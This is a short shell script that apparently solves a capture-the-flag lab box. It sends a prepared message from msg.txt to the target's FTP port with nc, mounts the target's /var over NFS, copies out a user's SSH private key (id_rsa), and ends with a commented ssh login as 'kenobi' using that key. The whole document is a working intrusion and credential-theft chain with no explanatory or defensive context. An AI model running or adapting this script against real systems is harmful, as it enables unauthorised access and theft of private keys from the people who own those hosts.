#!/bin/sh
# This is a comment!
echo staaa

echo "ctrl c 1s"

#read $REPLY

ip="10.10.103.189"

nc $ip 21 < msg.txt

#sleep 1

echo "nc done"



sudo umount /mnt/knfs && rm -r /mnt/knfs && mkdir /mnt/knfs && mount $ip:/var /mnt/knfs
#ls -la /mnt/knfs

echo reached

cp /mnt/knfs/tmp/id_rsa .
sudo chmod 600 id_rsa
#ssh -i id_rsa kenobi@10.10.103.189


